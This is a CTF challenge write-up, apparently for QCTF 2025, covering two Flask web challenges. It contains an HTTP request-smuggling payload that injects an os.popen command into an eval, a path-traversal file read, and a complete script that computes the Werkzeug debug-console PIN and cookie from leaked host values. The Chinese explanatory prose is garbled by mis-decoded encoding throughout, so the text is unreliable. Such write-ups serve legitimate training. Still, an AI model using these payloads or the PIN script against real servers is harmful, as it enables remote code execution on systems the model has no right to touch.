</span></span><span class="line"><span class="cl">    <span class="n">proxy_socket</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">proxy_socket</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="mi">8000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">proxy_socket</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">client_socket</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">proxy_socket</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">client_handler</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">handle_client</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">client_socket</span><span class="p">,))</span>
</span></span><span class="line"><span class="cl">        <span class="n">client_handler</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>wafå¾ˆå¤šï¼Œæ¼æ´ç‚¹åœ¨/calcè·¯ç”±é‡Œæœ‰ä¸€ä¸ªevalï¼Œä½†æ˜¯waéå¸¸éå¸¸å¤šã€‚ä¸æ˜¯ä¸€èˆ¬äººç»•çš„</p>
<p>é¢„æœŸè§£ä¹Ÿä¸æ˜¯æ­»å‘½ç»•waf</p>
<p>é¦–å…ˆæˆ‘ä»¬çœ‹åˆ°æºç é‡Œå®ç°äº†ä¸€ä¸ªä»£ç†æœåŠ¡å™¨ï¼Œåªæœ‰ä¸ºpostçš„æ—¶å€™æ‰ä¼šå¾€åèµ°ï¼Œç„¶åæ˜¯å¤„ç†CLå’ŒTEä¸¤ä¸ªå¤´</p>
<p><img src="/p/qctf2025/image-20251118211252400.png"
	width="1033"
	height="190"
	srcset="/p/qctf2025/image-20251118211252400_hu9138919535248832235.png 480w, /p/qctf2025/image-20251118211252400_hu17337075546902664785.png 1024w"
	loading="lazy"
	
		alt="image-20251118211252400"
	
	
		class="gallery-image" 
		data-flex-grow="543"
		data-flex-basis="1304px"
	
></p>
<p>å…³äºcontent-lengthå’Œtransfer-encodingçš„ä½œç”¨éƒ½æ˜¯å‘Šè¯‰æœåŠ¡å™¨è¯·æ±‚åˆ°å“ªé‡Œç»“æŸç”¨çš„ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œä»£ç†æœåŠ¡å™¨ä¼šå¯¹TEç‰¹æ®Šå¤„ç†ï¼Œå°±ç®—æœ‰é—®é¢˜ä¹Ÿä¼šè½¬å‘å‡ºå»ã€‚ä½†æ˜¯flaskå¹¶ä¸çŸ¥é“TEï¼Œè¿™é‡Œå°±äº§ç”Ÿäº†httpè¯·æ±‚èµ°ç§</p>
<p><img src="/p/qctf2025/image-20251118211704218.png"
	width="1141"
	height="1006"
	srcset="/p/qctf2025/image-20251118211704218_hu15217120285025721185.png 480w, /p/qctf2025/image-20251118211704218_hu684980166169187805.png 1024w"
	loading="lazy"
	
		alt="image-20251118211704218"
	
	
		class="gallery-image" 
		data-flex-grow="113"
		data-flex-basis="272px"
	
></p>
<p>å¯ä»¥çŸ¥é“åªè¦å­˜åœ¨<code>transfer-encoding</code>è¿™ä¸ªhttpå¤´ï¼Œä¸­é—´è½¬å‘æ—¶éƒ½ä¼šbodyçš„æ•°æ®å½“åˆ<code>transfer-encoding:chunked </code>å¤„ç†ï¼Œè€Œ<code>flask</code>åªæœ‰<code>transfer-encoding:chunked</code>æ—¶æ‰ä¼šåš<code>chunked</code>çš„è§£æï¼Œå…¶ä»–æƒ…å†µéƒ½ä¼šå½“åˆæ™®é€šçš„POSTå¤„ç†</p>
<p>æ‰€ä»¥æˆ‘ä»¬è®¾ç½®TE=1ï¼Œè€Œä¸”è¿™ä¸ªä»£ç è§£æTEæ—¶ä¼šæŠŠ0è§†ä½œæ•°æ®åœæ­¢çš„æ ‡å¿—ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥åŠ ä¸ª0ï¼Œç„¶ååé¢åŠ ä¸ª&amp;ç”¨äºä¼ é€’å…¶ä»–å‚æ•°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Transfer-Encoding: xxx
</span></span><span class="line"><span class="cl">Content-Length: 48
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">0
</span></span><span class="line"><span class="cl">&amp;calc= _ import _ (&#34;os&#34;).popen(&#34;whoami&#34;).read()
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯èƒ½æ˜¯ç¯å¢ƒçš„åŸå› ï¼Œæˆ‘å°è¯•äº†å¾ˆå¤šæ¬¡éƒ½æ˜¯é”™çš„ï¼Œè¿™é‡Œå°±å…ˆè·³è¿‡äº†ã€‚</p>
<h3 id="å¥½åƒä»€ä¹ˆéƒ½èƒ½è¯»">å¥½åƒä»€ä¹ˆéƒ½èƒ½è¯»
</h3><h4 id="çŸ¥è¯†ç‚¹flask-pinç è®¡ç®—">çŸ¥è¯†ç‚¹ï¼šflask pinç è®¡ç®—
</h4><p>å¯ä»¥ç›´æ¥è¯»åˆ°/etc/passwdï¼Œå°è¯•èƒ½ä¸èƒ½è¯»æºç </p>
<p>ç›´æ¥è¯»/app/app.pyæ˜¯æ²¡ç”¨çš„ä¼šæŠ¥é”™ï¼Œä½†æ˜¯è§‚å¯ŸæŠ¥é”™ï¼Œæ˜¯å¯ä»¥å‘ç°æœ‰æºç è·¯å¾„çš„</p>
<p><img src="/p/qctf2025/image-20251120084913461.png"
	width="1497"
	height="523"
	srcset="/p/qctf2025/image-20251120084913461_hu5694285811218972988.png 480w, /p/qctf2025/image-20251120084913461_hu16059567202131613434.png 1024w"
	loading="lazy"
	
		alt="image-20251120084913461"
	
	
		class="gallery-image" 
		data-flex-grow="286"
		data-flex-basis="686px"
	
></p>
<p>å°è¯•è¯»å–æˆåŠŸ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">../../home/ctf/app/app.py
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/qctf2025/image-20251120084524541.png"
	width="1534"
	height="1007"
	srcset="/p/qctf2025/image-20251120084524541_hu13850509844821119104.png 480w, /p/qctf2025/image-20251120084524541_hu6032653471556871093.png 1024w"
	loading="lazy"
	
		alt="image-20251120084524541"
	
	
		class="gallery-image" 
		data-flex-grow="152"
		data-flex-basis="365px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hello_world</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/read&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># è·å–è¯·æ±‚å‚æ•°ä¸­çš„æ–‡ä»¶å</span>
</span></span><span class="line"><span class="cl">    <span class="n">filename</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;filename&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">filename</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;éœ€è¦æä¾›æ–‡ä»¶å&#34;</span><span class="p">,</span> <span class="mi">400</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">content</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">content</span><span class="p">,</span> <span class="mi">200</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æºç éå¸¸çš„ç®€æ´ï¼Œæ²¡æœ‰ä»€ä¹ˆå…¶ä»–çš„åŠŸèƒ½é€»è¾‘ï¼Œç»“åˆæç¤ºè¯´è¦æˆ‘ä»¬è®¡ç®—ä»€ä¹ˆä¸œè¥¿</p>
<p>ç»è¿‡æœç´¢å¯ä»¥å‘ç°åœ¨Flaskçš„è°ƒè¯•æ¨¡å¼ä¸‹ï¼ŒWerkzeugä¼šç”Ÿæˆä¸€ä¸ªPINç ï¼Œç”¨äºä¿æŠ¤è°ƒè¯•æ§åˆ¶å°çš„è®¿é—®ã€‚</p>
<p>ç”Ÿæˆpinç éœ€è¦</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">usernameï¼Œç”¨æˆ·å                            //è¯»å–/etc/passwd
</span></span><span class="line"><span class="cl">modnameï¼Œé»˜è®¤å€¼ä¸ºflask.app                  
</span></span><span class="line"><span class="cl">appnameï¼Œé»˜è®¤å€¼ä¸ºFlask
</span></span><span class="line"><span class="cl">moddirï¼Œflaskåº“ä¸‹app.pyçš„ç»å¯¹è·¯å¾„            //æ–‡ä»¶æ‰€åœ¨è·¯å¾„ï¼Œä¸€èˆ¬å¯ä»¥é€šè¿‡æŸ¥çœ‹debugæŠ¥é”™ä¿¡æ¯è·å¾—
</span></span><span class="line"><span class="cl">uuidnodeï¼Œå½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•°         //è¯»å–/sys/class/net/eth0/address  è½¬æ¢æˆåè¿›åˆ¶
</span></span><span class="line"><span class="cl">machine_idï¼Œdockeræœºå™¨id
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">//æ¯ä¸€ä¸ªæœºå™¨éƒ½ä¼šæœ‰è‡ªå·²å”¯ä¸€çš„idï¼Œlinuxçš„idä¸€èˆ¬å­˜æ”¾åœ¨/etc/machine-idæˆ–/proc/sys/kernel/random/boot_idï¼Œdockeré¶æœºåˆ™è¯»å–/proc/self/cgroupï¼Œå…¶ä¸­ç¬¬ä¸€è¡Œçš„/docker/å­—ç¬¦ä¸²åé¢çš„å†…å®¹ä½œä¸ºæœºå™¨çš„idï¼Œåœ¨dockerç¯å¢ƒä¸‹è¯»å–åä¸¤ä¸ªï¼Œédockerç¯å¢ƒä¸‰ä¸ªéƒ½éœ€è¦è¯»å–
</span></span></code></pre></td></tr></table>
</div>
</div><p>éƒ½å¯ä»¥é€šè¿‡æ–‡ä»¶è¯»å–è¯»å‡ºæ¥</p>
<p><code>moddir</code></p>
<p><img src="/p/qctf2025/image-20251120093433628.png"
	width="1438"
	height="374"
	srcset="/p/qctf2025/image-20251120093433628_hu9346091864619765595.png 480w, /p/qctf2025/image-20251120093433628_hu12983717594851368262.png 1024w"
	loading="lazy"
	
		alt="image-20251120093433628"
	
	
		class="gallery-image" 
		data-flex-grow="384"
		data-flex-basis="922px"
	
></p>
<p><code>uuidnode</code></p>
<p><img src="/p/qctf2025/image-20251120093539457.png"
	width="910"
	height="503"
	srcset="/p/qctf2025/image-20251120093539457_hu7595448732708337145.png 480w, /p/qctf2025/image-20251120093539457_hu11612120354000551916.png 1024w"
	loading="lazy"
	
		alt="image-20251120093539457"
	
	
		class="gallery-image" 
		data-flex-grow="180"
		data-flex-basis="434px"
	
></p>
<p><img src="/p/qctf2025/image-20251120093728355.png"
	width="555"
	height="860"
	srcset="/p/qctf2025/image-20251120093728355_hu816882307838922833.png 480w, /p/qctf2025/image-20251120093728355_hu13888075007338329441.png 1024w"
	loading="lazy"
	
		alt="image-20251120093728355"
	
	
		class="gallery-image" 
		data-flex-grow="64"
		data-flex-basis="154px"
	
></p>
<p><code>machine_id</code></p>
<p><img src="/p/qctf2025/image-20251120093838533.png"
	width="1006"
	height="585"
	srcset="/p/qctf2025/image-20251120093838533_hu12122972221629008702.png 480w, /p/qctf2025/image-20251120093838533_hu8805144820356281652.png 1024w"
	loading="lazy"
	
		alt="image-20251120093838533"
	
	
		class="gallery-image" 
		data-flex-grow="171"
		data-flex-basis="412px"
	
></p>
<p>è®¡ç®—pinç çš„è„šæœ¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">chain</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å…¬é’¥éƒ¨åˆ†ï¼ˆéœ€è¦æ ¹æ®ç›®æ ‡ç¯å¢ƒä¿®æ”¹ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;ctf&#39;</span><span class="p">,</span>  <span class="c1"># è¿è¡ŒFlaskçš„ç”¨æˆ·å</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;flask.app&#39;</span><span class="p">,</span>  <span class="c1"># åº”ç”¨åç§°</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Flask&#39;</span><span class="p">,</span>  <span class="c1"># æ¡†æ¶ç±»å</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;/home/ctf/.local/lib/python3.13/site-packages/flask/app.py&#39;</span>  <span class="c1"># Flaskåº“çš„è·¯å¾„ï¼Œéœ€æ ¹æ®ç›®æ ‡ç¯å¢ƒä¿®æ”¹</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ç§é’¥éƒ¨åˆ†ï¼ˆç”±MACåœ°å€å’Œå¯åŠ¨IDç»„æˆï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># è¿™é‡Œéœ€è¦å¡«å…¥å®é™…çš„MACåœ°å€å’Œå¯åŠ¨ID</span>
</span></span><span class="line"><span class="cl"><span class="n">mac</span> <span class="o">=</span> <span class="s1">&#39;227319669631270&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="n">boot_id</span> <span class="o">=</span> <span class="s1">&#39;7ef29fa7-8a40-4624-a609-946e8d285ff8&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="n">mac</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">boot_id</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hash_pin</span><span class="p">(</span><span class="n">pin</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;è®¡ç®—PINç çš„å“ˆå¸Œå€¼ï¼Œç”¨äºç”Ÿæˆcookieå€¼&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">pin</span><span class="si">}</span><span class="s2"> added salt&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">,</span> <span class="s2">&#34;replace&#34;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">12</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_pin_and_cookie</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># ä½¿ç”¨SHA1å“ˆå¸Œç®—æ³•</span>
</span></span><span class="line"><span class="cl">    <span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># åˆå¹¶å…¬é’¥å’Œç§é’¥éƒ¨åˆ†å¹¶æ›´æ–°å“ˆå¸Œ</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">bit</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># å¦‚æœæ˜¯å­—ç¬¦ä¸²åˆ™è½¬ä¸ºUTF-8ç¼–ç çš„å­—èŠ‚æµ</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">bit</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">bit</span> <span class="o">=</span> <span class="n">bit</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># æ·»åŠ cookiesaltåˆ°å“ˆå¸Œè®¡ç®—</span>
</span></span><span class="line"><span class="cl">    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;cookiesalt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># ç”Ÿæˆcookieåç§°</span>
</span></span><span class="line"><span class="cl">    <span class="n">cookie_name</span> <span class="o">=</span> <span class="s1">&#39;__wzd&#39;</span> <span class="o">+</span> <span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># è®¡ç®—PINç æ•°å­—éƒ¨åˆ†</span>
</span></span><span class="line"><span class="cl">    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;pinsalt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># å°†å“ˆå¸Œç»“æœè½¬ä¸ºæ•´æ•°å¹¶å–å‰9ä½</span>
</span></span><span class="line"><span class="cl">    <span class="n">num</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;</span><span class="si">%09d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))[:</span><span class="mi">9</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># æ ¼å¼åŒ–PINç ä¸ºåˆ†ç»„å½¢å¼ï¼ˆå¦‚xxxxx-xxxx-xxxï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="n">rv</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">group_size</span> <span class="ow">in</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="n">group_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">rv</span> <span class="o">=</span> <span class="s1">&#39;-&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="n">num</span><span class="p">[</span><span class="n">x</span><span class="p">:</span><span class="n">x</span> <span class="o">+</span> <span class="n">group_size</span><span class="p">]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="n">group_size</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="n">group_size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># ç”Ÿæˆå®Œæ•´çš„cookieå€¼ï¼ˆæ—¶é—´æˆ³|å“ˆå¸Œå€¼ï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="n">current_time</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">cookie_value</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">current_time</span><span class="si">}</span><span class="s2">|</span><span class="si">{</span><span class="n">hash_pin</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">rv</span><span class="p">,</span> <span class="n">cookie_name</span><span class="p">,</span> <span class="n">cookie_value</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># è·å–PINç å’Œcookieä¿¡æ¯</span>
</span></span><span class="line"><span class="cl">    <span class="n">pin</span><span class="p">,</span> <span class="n">cookie_name</span><span class="p">,</span> <span class="n">cookie_value</span> <span class="o">=</span> <span class="n">get_pin_and_cookie</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># æ‰“å°ç”Ÿæˆçš„ä¿¡æ¯</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Generated Flask PIN: </span><span class="si">{</span><span class="n">pin</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Cookie Name: </span><span class="si">{</span><span class="n">cookie_name</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Cookie Value: </span><span class="si">{</span><span class="n">cookie_value</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
